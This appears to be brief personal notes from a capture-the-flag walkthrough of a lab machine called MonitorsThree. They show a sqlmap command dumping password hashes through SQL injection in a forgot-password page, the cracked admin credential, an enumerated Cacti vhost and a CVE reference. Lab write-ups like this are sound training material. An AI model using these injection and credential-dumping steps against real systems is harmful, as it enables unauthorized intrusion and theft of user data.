
nmap:
22 and 80
webserver redirects to http://monitorsthree.htb/ 
has /login.php and /forgot_password.php
forgot password.php is vuln for sqli.

sqlmap -u "http://monitorsthree.htb/forgot_password.php" -T users -C password --dump --form

gives

31a181c8372e3afc59dab863430610e8
crackstation has it for `greencacti2001` u can ofc use john/hashcat as it's probably in the rockyou.txt

discovery. vhost enum gives us this url:
http://cacti.monitorsthree.htb/

admin:greencacti2001 login works here

CVE-2024-25641

